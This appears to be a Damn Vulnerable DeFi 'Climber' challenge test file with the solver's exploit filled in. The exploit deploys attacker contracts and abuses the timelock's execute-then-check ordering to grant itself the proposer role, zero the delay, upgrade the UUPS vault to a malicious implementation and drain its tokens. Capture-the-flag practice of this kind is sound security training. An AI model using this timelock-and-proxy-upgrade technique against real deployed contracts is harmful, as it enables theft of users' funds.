const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, attacker;

  // Vault starts with 10 million tokens
  const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ethers.utils.parseEther("0.1")
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    this.vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await this.vault.getSweeper()).to.eq(sweeper.address);
    expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0");
    expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await this.vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await this.vault.owner();
    this.timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock roles are correctly initialized
    expect(
      await this.timelock.hasRole(
        await this.timelock.PROPOSER_ROLE(),
        proposer.address
      )
    ).to.be.true;
    expect(
      await this.timelock.hasRole(
        await this.timelock.ADMIN_ROLE(),
        deployer.address
      )
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    const attackVault = this.vault.connect(attacker);
    const attackTimeLock = this.timelock.connect(attacker);
    const attackToken = this.token.connect(attacker);

    const attackContractFactory = await ethers.getContractFactory(
      "EvilClimberContract",
      attacker
    );

    const attackContract = await attackContractFactory.deploy(
      attackVault.address,
      attackTimeLock.address,
      attackToken.address,
      attacker.address
    );

    const maliciousVaultFactory = await ethers.getContractFactory(
      "AttackClimber",
      attacker
    );
    const maliciousVaultContract = await maliciousVaultFactory.deploy();

    const PROPOSER_ROLE = ethers.utils.keccak256(
      ethers.utils.toUtf8Bytes("PROPOSER_ROLE")
    );

    console.log("Timelock address", attackTimeLock.address)
    console.log("vaultAddress ", maliciousVaultContract.address)

    /**
      * We have to trick the contract on executing malicious code. The problem here that we can schedule a task  and we should be having the proposer role to execute it. 
      * The first task can be done easily however we should be getting the proposer role
      * After getting that role we change the logic contract to a new one of our own that mimic the same methods for the first one
      * We use the new evil contract to update the delay to 0 days and then sweep all the funds
      */

    const setupRoleABI = ["function grantRole(bytes32 role,address account)"];
    const grantRoleData = generateInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, attackContract.address])

    const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
    const updateDelayData = generateInterface(updateDelayABI, "updateDelay", [0]);

    const upgradeABI = ["function upgradeTo(address newImplementation)"];
    const upgradeData = generateInterface(upgradeABI, "upgradeTo", [maliciousVaultContract.address])

    const exploitABI = ["function exploit()"];
    const exploitData = generateInterface(exploitABI, "exploit", [])

    const toAddress = [attackTimeLock.address, attackTimeLock.address, attackVault.address, attackContract.address]
    const data = [grantRoleData, updateDelayData, upgradeData, exploitData]


    await attackContract.setScheduleData(
      toAddress,
      data
    )

    await attackTimeLock.execute(
      toAddress,
      Array(data.length).fill(0),
      data,
      ethers.utils.hexZeroPad("0x00", 32)
    );

    await (await attackContract.withdraw()).wait(0)

  });

  const generateInterface = (methodSignature, methodName, arguments) => {
    const ABI = methodSignature;
    const interface = new ethers.utils.Interface(ABI);
    const data = interface.encodeFunctionData(methodName, arguments);
    return data;
  }

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.vault.address)).to.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      VAULT_TOKEN_BALANCE
    );
  });
});
